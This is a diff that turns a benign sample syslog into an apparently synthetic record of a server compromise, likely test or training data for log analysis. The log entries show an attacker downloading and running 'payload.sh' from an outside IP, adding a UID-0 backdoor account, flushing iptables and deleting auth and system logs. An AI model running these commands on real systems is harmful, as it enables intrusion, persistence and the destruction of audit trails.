@@ -1,15 +1,60 @@
-Feb 14 09:00:01 host systemd[1]: Started Session 1 of user root.
-Feb 14 09:00:05 host kernel: [    0.000000] Linux version 5.15.0-91-generic
-Feb 14 09:01:02 host kernel: [ 1234.567890] EXT4-fs warning (device sda1): ext4_warning:123: mounting fs with errors, running e2fsck is recommended
-Feb 14 09:01:12 host notesync[1152]: Error loading preference cache: file not found
-Feb 14 09:01:55 host kernel: [ 1345.678901] end_request: I/O error, dev sda, sector 1234567
-Feb 14 09:02:10 host sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
-Feb 14 09:02:30 host kernel: [ 1456.789012] Out of memory: Kill process 1234 (chrome) score 900 or sacrifice child
-Feb 14 09:03:10 host systemd[1]: NetworkManager-dispatcher.service: Unexpected timeout contacting D-Bus.
-Feb 14 09:03:20 host kernel: [ 1567.890123] Connection refused by remote host 160.102220
-Feb 14 09:04:01 host sudo[5678]: authentication failure; logname= uid=1000 euid=0 tty=/dev/pts/0 ruser=will rhost=
-Feb 14 09:05:00 host systemd[1]: session-1.scope: Succeeded.
-Feb 14 09:06:04 host sudo[5679]: will : command not allowed ; TTY=pts/0 ; PWD=/home/will ; USER=root ; COMMAND=/bin/bash
-Feb 14 09:07:11 host kernel: [ 1890.123456] BTRFS warning (device sdb): checksum error at logical 1234567890
-Feb 14 09:08:00 host systemd[1]: Stopping Daily apt download activities.
-Feb 14 09:09:30 host kernel: [ 2100.234567] segfault at 0 ip 00007f1234567890 sp 00007ffd12345678 error 4 in chrome[7f1234000000+3200000]
+Mar 15 02:14:31 prod-web-01 sshd[3421]: Failed password for root from 45.33.32.156 port 43872 ssh2
+Mar 15 02:14:32 prod-web-01 sshd[3422]: Failed password for root from 45.33.32.156 port 43873 ssh2
+Mar 15 02:14:33 prod-web-01 sshd[3423]: Failed password for root from 45.33.32.156 port 43874 ssh2
+Mar 15 02:14:34 prod-web-01 sshd[3424]: Failed password for invalid user admin from 45.33.32.156 port 43875 ssh2
+Mar 15 02:14:35 prod-web-01 sshd[3425]: Failed password for invalid user ubuntu from 45.33.32.156 port 43876 ssh2
+Mar 15 02:14:36 prod-web-01 sshd[3426]: Failed password for invalid user deploy from 45.33.32.156 port 43877 ssh2
+Mar 15 02:14:37 prod-web-01 sshd[3427]: Failed password for invalid user git from 45.33.32.156 port 43878 ssh2
+Mar 15 02:14:38 prod-web-01 sshd[3428]: Failed password for invalid user postgres from 45.33.32.156 port 43879 ssh2
+Mar 15 02:14:39 prod-web-01 sshd[3429]: Failed password for invalid user oracle from 45.33.32.156 port 43880 ssh2
+Mar 15 02:14:40 prod-web-01 sshd[3430]: Failed password for invalid user test from 45.33.32.156 port 43881 ssh2
+Mar 15 02:14:41 prod-web-01 sshd[3431]: Failed password for invalid user pi from 45.33.32.156 port 43882 ssh2
+Mar 15 02:14:42 prod-web-01 sshd[3432]: Failed password for invalid user ftpuser from 45.33.32.156 port 43883 ssh2
+Mar 15 02:14:43 prod-web-01 sshd[3433]: Failed password for root from 45.33.32.156 port 43884 ssh2
+Mar 15 02:14:44 prod-web-01 sshd[3434]: Failed password for root from 45.33.32.156 port 43885 ssh2
+Mar 15 02:14:45 prod-web-01 sshd[3435]: Accepted password for root from 45.33.32.156 port 43886 ssh2
+Mar 15 02:14:45 prod-web-01 sshd[3435]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Mar 15 02:14:52 prod-web-01 sudo[3441]: pam_unix(sudo:auth): authentication failure; logname= uid=1001 euid=0 tty=/dev/pts/0 ruser=deploy rhost=
+Mar 15 02:14:52 prod-web-01 sudo[3441]: deploy : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
+Mar 15 02:15:01 prod-web-01 cron[3451]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
+Mar 15 02:15:03 prod-web-01 kernel: [ 8821.334521] UFW BLOCK IN=eth0 OUT= MAC=00:16:3e:xx:xx:xx SRC=45.33.32.156 DST=10.0.0.5 LEN=44 TOS=0x00 PREC=0x00 TTL=52 ID=54321 PROTO=TCP DPT=3306 WINDOW=1024 RES=0x00 SYN URGP=0
+Mar 15 02:15:04 prod-web-01 kernel: [ 8822.441231] UFW BLOCK IN=eth0 OUT= MAC=00:16:3e:xx:xx:xx SRC=45.33.32.156 DST=10.0.0.5 LEN=44 TOS=0x00 PREC=0x00 TTL=52 ID=54322 PROTO=TCP DPT=5432 WINDOW=1024 RES=0x00 SYN URGP=0
+Mar 15 02:15:05 prod-web-01 kernel: [ 8823.112043] UFW BLOCK IN=eth0 OUT= MAC=00:16:3e:xx:xx:xx SRC=45.33.32.156 DST=10.0.0.5 LEN=44 TOS=0x00 PREC=0x00 TTL=52 ID=54323 PROTO=TCP DPT=6379 WINDOW=1024 RES=0x00 SYN URGP=0
+Mar 15 02:15:11 prod-web-01 kernel: [ 8829.334521] TCP: Possible SYN flooding on port 80. Sending cookies. Check SNMP counters.
+Mar 15 02:15:14 prod-web-01 fail2ban.actions[2201]: WARNING [sshd] Ban 45.33.32.156
+Mar 15 02:15:31 prod-web-01 sudo[3461]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://45.33.32.156/payload.sh
+Mar 15 02:15:32 prod-web-01 sudo[3462]: root : TTY=pts/0 ; PWD=/root ; COMMAND=/bin/chmod +x /tmp/payload.sh
+Mar 15 02:15:33 prod-web-01 sudo[3463]: root : TTY=pts/0 ; PWD=/root ; COMMAND=/tmp/payload.sh
+Mar 15 02:15:45 prod-web-01 kernel: [ 8863.221043] Out of memory: Killed process 4821 (mysqld) total-vm:2097152kB, anon-rss:1048576kB, file-rss:0kB, shmem-rss:0kB
+Mar 15 02:15:46 prod-web-01 systemd[1]: mysql.service: Main process exited, code=killed, status=9/KILL
+Mar 15 02:15:46 prod-web-01 systemd[1]: mysql.service: Failed with result signal.
+Mar 15 02:15:46 prod-web-01 systemd[1]: Failed to start MySQL Community Server.
+Mar 15 02:15:51 prod-web-01 kernel: [ 8869.334521] end_request: I/O error, dev sda, sector 9814037167
+Mar 15 02:15:52 prod-web-01 kernel: [ 8870.441231] EXT4-fs error (device sda1): ext4_validate_block_bitmap:376: comm kworker/u4:2: bg 0: bad block bitmap checksum
+Mar 15 02:15:53 prod-web-01 kernel: [ 8871.112043] BTRFS warning (device sdb): checksum error at logical 549755813888 on dev /dev/sdb
+Mar 15 02:16:01 prod-web-01 kernel: [ 8879.334521] device eth0 entered promiscuous mode
+Mar 15 02:16:03 prod-web-01 useradd[3481]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
+Mar 15 02:16:04 prod-web-01 passwd[3482]: pam_unix(passwd:chauthtok): password changed for backdoor
+Mar 15 02:16:11 prod-web-01 crontab[3491]: (root) BEGIN EDIT (root)
+Mar 15 02:16:12 prod-web-01 crontab[3492]: (root) END EDIT (root)
+Mar 15 02:16:14 prod-web-01 kernel: [ 8892.221043] segfault at 7f4a2b000000 ip 00007f4a2b1c3d10 sp 00007ffde4821230 error 4 in libcrypto.so.1.1[7f4a2a800000+600000]
+Mar 15 02:16:21 prod-web-01 sshd[3501]: Accepted publickey for backdoor from 45.33.32.156 port 55221 ssh2
+Mar 15 02:16:22 prod-web-01 sshd[3501]: pam_unix(sshd:session): session opened for user backdoor by (uid=0)
+Mar 15 02:16:31 prod-web-01 kernel: [ 8909.334521] possible recursive locking detected
+Mar 15 02:16:44 prod-web-01 sudo[3511]: root : TTY=pts/1 ; PWD=/root ; COMMAND=/sbin/iptables -F
+Mar 15 02:16:45 prod-web-01 sudo[3512]: root : TTY=pts/1 ; PWD=/root ; COMMAND=/sbin/iptables -X
+Mar 15 02:16:51 prod-web-01 kernel: [ 8929.112043] nf_conntrack: table full, dropping packet
+Mar 15 02:17:01 prod-web-01 cron[3521]: (root) CMD (/tmp/payload.sh > /dev/null 2>&1)
+Mar 15 02:17:03 prod-web-01 auditd[441]: type=SYSCALL msg=audit(1741909023.441:2841): syscall=59 exe=/bin/bash comm=bash key=exec_commands uid=0
+Mar 15 02:17:14 prod-web-01 systemd[1]: Started Daily man-db regeneration.
+Mar 15 02:17:31 prod-web-01 rsyslogd[441]: -- MARK --
+Mar 15 02:18:01 prod-web-01 sshd[3541]: Disconnected from user backdoor 45.33.32.156 port 55221
+Mar 15 02:18:21 prod-web-01 sudo[3551]: root : TTY=pts/0 ; PWD=/root ; COMMAND=/bin/rm -rf /var/log/auth.log
+Mar 15 02:18:22 prod-web-01 sudo[3552]: root : TTY=pts/0 ; PWD=/root ; COMMAND=/bin/rm -rf /var/log/syslog
+Mar 15 02:18:31 prod-web-01 kernel: [ 9029.441231] audit: audit_lost=128 audit_rate_limit=0 audit_backlog_limit=64
+Mar 15 02:18:44 prod-web-01 kernel: [ 9042.112043] TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.
+Mar 15 02:19:01 prod-web-01 systemd[1]: nginx.service: Watchdog timeout (limit 30s).
+Mar 15 02:19:02 prod-web-01 systemd[1]: nginx.service: Failed with result watchdog.
+Mar 15 02:19:03 prod-web-01 systemd[1]: Failed to start A high performance web server and a reverse proxy server.
+Mar 15 02:19:11 prod-web-01 kernel: [ 9069.334521] BUG: unable to handle kernel NULL pointer dereference at 0000000000000000
+Mar 15 02:19:12 prod-web-01 kernel: [ 9070.441231] Kernel panic - not syncing: Fatal exception
